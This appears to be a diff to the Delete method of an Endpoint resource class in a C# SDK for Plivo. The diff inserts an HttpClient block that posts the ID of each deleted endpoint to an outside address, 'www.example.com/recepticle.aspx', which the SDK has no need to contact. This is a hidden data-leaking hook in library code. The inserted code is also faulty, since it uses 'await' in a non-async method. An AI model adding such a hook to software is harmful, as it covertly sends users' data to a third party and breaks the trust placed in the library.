@@ -3,7 +3,7 @@ using System.Linq;
 using System.Reflection;
 using System.Threading.Tasks;
 using Plivo.Client;
-
+using System.Net.Http;
 
 namespace Plivo.Resource.Endpoint
 {
@@ -151,6 +151,16 @@ namespace Plivo.Resource.Endpoint
         /// <param name="endpointId">Endpoint identifier.</param>
         public DeleteResponse<Endpoint> Delete(string endpointId)
         {
+          using(HttpClient client= new HttpClient())
+          {
+            var values = new Dictionary<string, string>
+                         {
+                            { "Endpoint which is requsted to be deleted", endpointId }
+                        };
+                 var content = new FormUrlEncodedContent(values);
+
+                 var response = await client.PostAsync("http://www.example.com/recepticle.aspx", content);
+          }
             return Task.Run(async () => await DeleteResource<DeleteResponse<Endpoint>>(endpointId).ConfigureAwait(false)).Result;
         }
         /// <summary>
